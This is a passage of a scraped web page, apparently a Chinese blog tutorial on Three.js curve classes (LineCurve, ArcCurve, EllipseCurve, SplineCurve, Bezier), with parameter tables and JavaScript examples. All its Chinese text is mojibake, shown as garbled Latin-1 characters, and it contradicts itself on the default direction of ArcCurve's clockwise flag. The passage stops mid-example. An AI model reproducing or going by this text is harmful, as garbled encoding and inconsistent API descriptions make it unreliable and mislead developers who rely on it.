                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å­¦ä¹ Three.js--æ›²çº¿(Curve)</h2>
<h3 data-id="heading-1">å‰ç½®æ ¸å¿ƒè¯´æ˜</h3>
<p><code>Curve</code> æ˜¯ Three.js ä¸­<strong>æ‰€æœ‰æ›²çº¿/ç›´çº¿çš„åŸºç±»</strong>ï¼Œå®šä¹‰äº†æ›²çº¿çš„æ ¸å¿ƒè¡Œä¸ºï¼ˆå¦‚é‡‡æ ·é¡¶ç‚¹ã€è®¡ç®—é•¿åº¦ç­‰ï¼‰ã€‚æ‰€æœ‰2D/3Dæ›²çº¿å‡ç»§æ‰¿è‡ª <code>Curve</code>ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ã€Œé€šè¿‡æ•°å­¦å…¬å¼ç”Ÿæˆè¿ç»­çš„é¡¶ç‚¹åºåˆ—ã€ï¼Œå†åŸºäºè¿™äº›é¡¶ç‚¹åˆ›å»ºçº¿æ¡æ¨¡å‹ï¼Œå®ç°ä»»æ„è‡ªå®šä¹‰æ›²çº¿çš„ç»˜åˆ¶ã€‚</p>
<h4 data-id="heading-2">æ ¸å¿ƒè§„åˆ™</h4>
<ol>
<li><strong>ç»´åº¦åˆ†ç±»</strong>ï¼š
<ul>
<li>2Dæ›²çº¿ï¼šåŸºäºXYå¹³é¢ï¼ˆZ=0ï¼‰ï¼Œç»§æ‰¿ <code>THREE.Curve</code>ï¼Œå¦‚ <code>LineCurve</code>/<code>ArcCurve</code>ï¼›</li>
<li>3Dæ›²çº¿ï¼šåŸºäºXYZä¸‰ç»´ç©ºé—´ï¼Œç»§æ‰¿ <code>THREE.Curve</code>ï¼ˆéƒ¨åˆ†åˆ«å/å­ç±»ï¼‰ï¼Œå¦‚ <code>LineCurve3</code>/<code>CatmullRomCurve3</code>ï¼›</li>
</ul>
</li>
<li><strong>æ ¸å¿ƒæµç¨‹</strong>ï¼š<br/>
<code>åˆ›å»ºæ›²çº¿å®ä¾‹ â†’ é‡‡æ ·é¡¶ç‚¹ï¼ˆgetPointsï¼‰ â†’ å‡ ä½•ä½“ç»‘å®šé¡¶ç‚¹ â†’ åˆ›å»ºçº¿æ¨¡å‹ â†’ æ·»åŠ åˆ°åœºæ™¯</code>ï¼›</li>
<li><strong>çº¿æ¨¡å‹ç±»å‹</strong>ï¼ˆå†³å®šæ›²çº¿æ¸²æŸ“æ–¹å¼ï¼‰ï¼š

























<table><thead><tr><th>æ¨¡å‹ç±»å‹</th><th>æ ¸å¿ƒç‰¹ç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>THREE.Line</code></td><td>æŒ‰é¡¶ç‚¹é¡ºåºç»˜åˆ¶è¿ç»­çº¿æ¡</td><td>å¼€æ”¾æ›²çº¿ï¼ˆå¦‚ç›´çº¿ã€è´å¡å°”æ›²çº¿ï¼‰</td></tr><tr><td><code>THREE.LineLoop</code></td><td>é—­åˆçº¿æ¡ï¼ˆæœ€åä¸€ä¸ªé¡¶ç‚¹è¿æ¥ç¬¬ä¸€ä¸ªï¼‰</td><td>å°é—­æ›²çº¿ï¼ˆå¦‚æ¤­åœ†ã€åœ†ï¼‰</td></tr><tr><td><code>THREE.LineSegments</code></td><td>æ¯ä¸¤ä¸ªé¡¶ç‚¹ä¸ºä¸€ç»„ç»˜åˆ¶åˆ†æ®µçº¿</td><td>ç¦»æ•£çº¿æ¡ï¼ˆå¦‚ç½‘æ ¼çº¿ï¼‰</td></tr></tbody></table>
</li>
<li><strong>é‡‡æ ·ç²¾åº¦</strong>ï¼š<code>getPoints(n)</code> ä¸­ <code>n</code> æ˜¯é‡‡æ ·ç‚¹æ•°ï¼ˆéé¡¶ç‚¹æ•°ï¼‰ï¼Œ<code>n</code> è¶Šå¤§æ›²çº¿è¶Šå¹³æ»‘ï¼ˆæ¨è50~100ï¼Œå¤æ‚æ›²çº¿å¯è®¾200ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-3">ä¸€ã€2Dæ›²çº¿ï¼ˆXYå¹³é¢ï¼ŒZ=0ï¼‰</h3>
<p>æ‰€æœ‰2Dæ›²çº¿å‡åŸºäºXYå¹³é¢ï¼ŒZåæ ‡é»˜è®¤0ï¼Œæ ¸å¿ƒç”¨äºç»˜åˆ¶å¹³é¢æ›²çº¿ã€‚</p>
<h4 data-id="heading-4">1. LineCurveï¼ˆ2Dç›´çº¿ï¼‰</h4>
<h5 data-id="heading-5">æ ¸å¿ƒè¯´æ˜</h5>
<p>ä¸¤ç‚¹ç¡®å®šçš„2Dç›´çº¿ï¼Œæ˜¯æœ€ç®€å•çš„2Dæ›²çº¿ï¼Œæ— æ›²ç‡ã€‚</p>
<h5 data-id="heading-6">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.LineCurve(èµ·ç‚¹å‘é‡, ç»ˆç‚¹å‘é‡)</span>
<span class="hljs-keyword">const</span> lineCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x1, y1), <span class="hljs-comment">// å¿…ä¼ ï¼šèµ·ç‚¹ï¼ˆVector2å¯¹è±¡ï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x2, y2)  <span class="hljs-comment">// å¿…ä¼ ï¼šç»ˆç‚¹ï¼ˆVector2å¯¹è±¡ï¼‰</span>
);
</code></pre>




















<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v1</code></td><td>THREE.Vector2</td><td>ç›´çº¿èµ·ç‚¹ï¼ˆXYåæ ‡ï¼‰</td></tr><tr><td><code>v2</code></td><td>THREE.Vector2</td><td>ç›´çº¿ç»ˆç‚¹ï¼ˆXYåæ ‡ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-7">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º2Dç›´çº¿ï¼ˆä»(0,0)åˆ°(100, 50)ï¼‰</span>
<span class="hljs-keyword">const</span> lineCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>)
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹ï¼ˆ50ä¸ªç‚¹ï¼Œç›´çº¿è¶³å¤Ÿå¹³æ»‘ï¼‰</span>
<span class="hljs-keyword">const</span> points = lineCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">50</span>);

<span class="hljs-comment">// 3. åˆ›å»ºå‡ ä½•ä½“å¹¶ç»‘å®šé¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);

<span class="hljs-comment">// 4. åˆ›å»ºçº¿æè´¨</span>
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xff0000</span> });

<span class="hljs-comment">// 5. åˆ›å»ºçº¿æ¨¡å‹ï¼ˆå¼€æ”¾ç›´çº¿ç”¨Lineï¼‰</span>
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-8">2. ArcCurveï¼ˆ2Dåœ†å¼§ï¼‰</h4>
<h5 data-id="heading-9">æ ¸å¿ƒè¯´æ˜</h5>
<p>åŸºäºåœ†å¿ƒã€åŠå¾„ã€èµ·å§‹è§’/ç»ˆæ­¢è§’çš„2Dåœ†å¼§ï¼Œå¯ç»˜åˆ¶åœ†ã€åŠåœ†ã€ä»»æ„å¼§åº¦çš„åœ†å¼§ã€‚</p>
<h5 data-id="heading-10">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.ArcCurve(åœ†å¿ƒX, åœ†å¿ƒY, åŠå¾„, èµ·å§‹è§’, ç»ˆæ­¢è§’, æ˜¯å¦é€†æ—¶é’ˆ)</span>
<span class="hljs-keyword">const</span> arcCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">ArcCurve</span>(
  <span class="hljs-number">0</span>,        <span class="hljs-comment">// å¿…ä¼ ï¼šåœ†å¿ƒXåæ ‡</span>
  <span class="hljs-number">0</span>,        <span class="hljs-comment">// å¿…ä¼ ï¼šåœ†å¿ƒYåæ ‡</span>
  <span class="hljs-number">50</span>,       <span class="hljs-comment">// å¿…ä¼ ï¼šåœ†å¼§åŠå¾„</span>
  <span class="hljs-number">0</span>,        <span class="hljs-comment">// å¿…ä¼ ï¼šèµ·å§‹è§’ï¼ˆå¼§åº¦ï¼Œ0=å³å‘Xè½´ï¼‰</span>
  <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,  <span class="hljs-comment">// å¿…ä¼ ï¼šç»ˆæ­¢è§’ï¼ˆå¼§åº¦ï¼ŒMath.PI=180Â°ï¼‰</span>
  <span class="hljs-literal">false</span>     <span class="hljs-comment">// å¯é€‰ï¼šæ˜¯å¦é€†æ—¶é’ˆç»˜åˆ¶ï¼Œé»˜è®¤falseï¼ˆé¡ºæ—¶é’ˆï¼‰</span>
);
</code></pre>















































<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>aX</code></td><td>Number</td><td>â€”</td><td>åœ†å¿ƒXåæ ‡</td></tr><tr><td><code>aY</code></td><td>Number</td><td>â€”</td><td>åœ†å¿ƒYåæ ‡</td></tr><tr><td><code>aRadius</code></td><td>Number</td><td>â€”</td><td>åœ†å¼§åŠå¾„</td></tr><tr><td><code>aStartAngle</code></td><td>Number</td><td>â€”</td><td>èµ·å§‹è§’åº¦ï¼ˆå¼§åº¦ï¼Œ0=Xè½´æ­£æ–¹å‘ï¼ŒMath.PI/2=Yè½´æ­£æ–¹å‘ï¼‰</td></tr><tr><td><code>aEndAngle</code></td><td>Number</td><td>â€”</td><td>ç»ˆæ­¢è§’åº¦ï¼ˆå¼§åº¦ï¼‰</td></tr><tr><td><code>aClockwise</code></td><td>Boolean</td><td>false</td><td>æ˜¯å¦é¡ºæ—¶é’ˆç»˜åˆ¶ï¼Œtrue=é¡ºæ—¶é’ˆï¼Œfalse=é€†æ—¶é’ˆ</td></tr></tbody></table>
<h5 data-id="heading-11">ä½¿ç”¨ç¤ºä¾‹ï¼ˆç»˜åˆ¶åŠåœ†ï¼‰</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»ºåŠåœ†ï¼ˆåœ†å¿ƒ(0,0)ï¼ŒåŠå¾„50ï¼Œ0~Ï€å¼§åº¦ï¼‰</span>
<span class="hljs-keyword">const</span> arcCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">ArcCurve</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = arcCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">50</span>);

<span class="hljs-comment">// 3. å‡ ä½•ä½“+æè´¨+æ¨¡å‹</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-12">3. EllipseCurveï¼ˆ2Dæ¤­åœ†/åœ†ï¼‰</h4>
<h5 data-id="heading-13">æ ¸å¿ƒè¯´æ˜</h5>
<p>åŸºäºåœ†å¿ƒã€é•¿åŠè½´ã€çŸ­åŠè½´çš„2Dæ¤­åœ†ï¼Œå½“é•¿åŠè½´=çŸ­åŠè½´æ—¶å³ä¸ºåœ†ï¼ˆæ›¿ä»£ArcCurveç»˜åˆ¶å®Œæ•´åœ†ï¼‰ã€‚</p>
<h5 data-id="heading-14">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.EllipseCurve(åœ†å¿ƒX, åœ†å¿ƒY, é•¿åŠè½´, çŸ­åŠè½´, èµ·å§‹è§’, ç»ˆæ­¢è§’, æ˜¯å¦é€†æ—¶é’ˆ, æ—‹è½¬è§’)</span>
<span class="hljs-keyword">const</span> ellipseCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">EllipseCurve</span>(
  <span class="hljs-number">0</span>,          <span class="hljs-comment">// å¿…ä¼ ï¼šåœ†å¿ƒXåæ ‡</span>
  <span class="hljs-number">0</span>,          <span class="hljs-comment">// å¿…ä¼ ï¼šåœ†å¿ƒYåæ ‡</span>
  <span class="hljs-number">100</span>,        <span class="hljs-comment">// å¿…ä¼ ï¼šXè½´æ–¹å‘é•¿åŠè½´</span>
  <span class="hljs-number">50</span>,         <span class="hljs-comment">// å¿…ä¼ ï¼šYè½´æ–¹å‘çŸ­åŠè½´</span>
  <span class="hljs-number">0</span>,          <span class="hljs-comment">// å¯é€‰ï¼šèµ·å§‹è§’ï¼Œé»˜è®¤0</span>
  <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,<span class="hljs-comment">// å¯é€‰ï¼šç»ˆæ­¢è§’ï¼Œé»˜è®¤2Ï€ï¼ˆå®Œæ•´æ¤­åœ†ï¼‰</span>
  <span class="hljs-literal">false</span>,      <span class="hljs-comment">// å¯é€‰ï¼šæ˜¯å¦é€†æ—¶é’ˆï¼Œé»˜è®¤false</span>
  <span class="hljs-number">0</span>           <span class="hljs-comment">// å¯é€‰ï¼šæ¤­åœ†æ—‹è½¬è§’ï¼ˆå¼§åº¦ï¼‰ï¼Œé»˜è®¤0</span>
);
</code></pre>



























































<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>aX</code></td><td>Number</td><td>â€”</td><td>åœ†å¿ƒXåæ ‡</td></tr><tr><td><code>aY</code></td><td>Number</td><td>â€”</td><td>åœ†å¿ƒYåæ ‡</td></tr><tr><td><code>xRadius</code></td><td>Number</td><td>â€”</td><td>Xè½´æ–¹å‘åŠè½´é•¿åº¦ï¼ˆé•¿åŠè½´ï¼‰</td></tr><tr><td><code>yRadius</code></td><td>Number</td><td>â€”</td><td>Yè½´æ–¹å‘åŠè½´é•¿åº¦ï¼ˆçŸ­åŠè½´ï¼‰</td></tr><tr><td><code>aStartAngle</code></td><td>Number</td><td>0</td><td>èµ·å§‹è§’åº¦ï¼ˆå¼§åº¦ï¼‰</td></tr><tr><td><code>aEndAngle</code></td><td>Number</td><td>2Ï€</td><td>ç»ˆæ­¢è§’åº¦ï¼ˆå¼§åº¦ï¼Œ2Ï€=å®Œæ•´æ¤­åœ†ï¼‰</td></tr><tr><td><code>aClockwise</code></td><td>Boolean</td><td>false</td><td>æ˜¯å¦é¡ºæ—¶é’ˆç»˜åˆ¶</td></tr><tr><td><code>aRotation</code></td><td>Number</td><td>0</td><td>æ¤­åœ†æ•´ä½“æ—‹è½¬è§’åº¦ï¼ˆå¼§åº¦ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-15">ä½¿ç”¨ç¤ºä¾‹ï¼ˆä¼˜åŒ–ç‰ˆï¼Œç”¨æˆ·ç¤ºä¾‹å‡çº§ï¼‰</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»ºæ¤­åœ†ï¼ˆåœ†å¿ƒ(0,0)ï¼Œé•¿åŠè½´100ï¼ŒçŸ­åŠè½´50ï¼Œå®Œæ•´æ¤­åœ†ï¼‰</span>
<span class="hljs-keyword">const</span> ellipseCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">EllipseCurve</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">50</span>);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹ï¼ˆ50ä¸ªç‚¹ï¼Œæ¤­åœ†è¶³å¤Ÿå¹³æ»‘ï¼‰</span>
<span class="hljs-keyword">const</span> points = ellipseCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">50</span>);

<span class="hljs-comment">// 3. åˆ›å»ºå‡ ä½•ä½“å¹¶ç»‘å®šé¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);

<span class="hljs-comment">// 4. çº¿æè´¨ï¼ˆçº¢è‰²ï¼Œçº¿å®½1ï¼‰</span>
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ 
  <span class="hljs-attr">color</span>: <span class="hljs-number">0xff0000</span>,
  <span class="hljs-attr">linewidth</span>: <span class="hljs-number">1</span> <span class="hljs-comment">// æ³¨æ„ï¼šWebGLä¸­çº¿å®½ä»…éƒ¨åˆ†æµè§ˆå™¨æ”¯æŒ&gt;1</span>
});

<span class="hljs-comment">// 5. åˆ›å»ºé—­åˆçº¿æ¨¡å‹ï¼ˆæ¤­åœ†ç”¨LineLoopï¼‰</span>
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineLoop</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-16">4. SplineCurveï¼ˆ2Dæ ·æ¡æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-17">æ ¸å¿ƒè¯´æ˜</h5>
<p>é€šè¿‡å¤šä¸ªæ§åˆ¶ç‚¹ç”Ÿæˆçš„å¹³æ»‘2Dæ›²çº¿ï¼ˆæ’å€¼æ›²çº¿ï¼‰ï¼Œæ›²çº¿ä¼šç©¿è¿‡æ‰€æœ‰æ§åˆ¶ç‚¹ï¼Œæ¯”è´å¡å°”æ›²çº¿æ›´æ˜“æ§åˆ¶ã€‚</p>
<h5 data-id="heading-18">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.SplineCurve(æ§åˆ¶ç‚¹æ•°ç»„)</span>
<span class="hljs-keyword">const</span> splineCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SplineCurve</span>([
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x1, y1),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x2, y2),
  <span class="hljs-comment">// ... æ›´å¤šæ§åˆ¶ç‚¹</span>
]);
</code></pre>















<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>points</code></td><td>Array&lt;THREE.Vector2&gt;</td><td>å¿…ä¼ ï¼š2Dæ§åˆ¶ç‚¹æ•°ç»„ï¼ˆè‡³å°‘2ä¸ªï¼Œè¶Šå¤šæ›²çº¿è¶Šå¤æ‚ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-19">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º2Dæ ·æ¡æ›²çº¿ï¼ˆ4ä¸ªæ§åˆ¶ç‚¹ï¼‰</span>
<span class="hljs-keyword">const</span> splineCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SplineCurve</span>([
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">0</span>),  <span class="hljs-comment">// æ§åˆ¶ç‚¹1</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(-<span class="hljs-number">50</span>, <span class="hljs-number">80</span>),  <span class="hljs-comment">// æ§åˆ¶ç‚¹2</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">50</span>, -<span class="hljs-number">80</span>),  <span class="hljs-comment">// æ§åˆ¶ç‚¹3</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>)    <span class="hljs-comment">// æ§åˆ¶ç‚¹4</span>
]);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹ï¼ˆ100ä¸ªç‚¹ï¼Œä¿è¯å¹³æ»‘ï¼‰</span>
<span class="hljs-keyword">const</span> points = splineCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 3. å‡ ä½•ä½“+æè´¨+æ¨¡å‹</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x0000ff</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-20">5. QuadraticBezierCurveï¼ˆ2DäºŒæ¬¡è´å¡å°”æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-21">æ ¸å¿ƒè¯´æ˜</h5>
<p>ç”±ã€Œèµ·ç‚¹+æ§åˆ¶ç‚¹+ç»ˆç‚¹ã€3ä¸ªç‚¹å®šä¹‰çš„2Dè´å¡å°”æ›²çº¿ï¼Œå•æ›²ç‡ï¼Œé€‚åˆç®€å•å¼¯æ›²ã€‚</p>
<h5 data-id="heading-22">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.QuadraticBezierCurve(èµ·ç‚¹, æ§åˆ¶ç‚¹, ç»ˆç‚¹)</span>
<span class="hljs-keyword">const</span> quadBezier = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">QuadraticBezierCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x1, y1), <span class="hljs-comment">// å¿…ä¼ ï¼šèµ·ç‚¹</span>
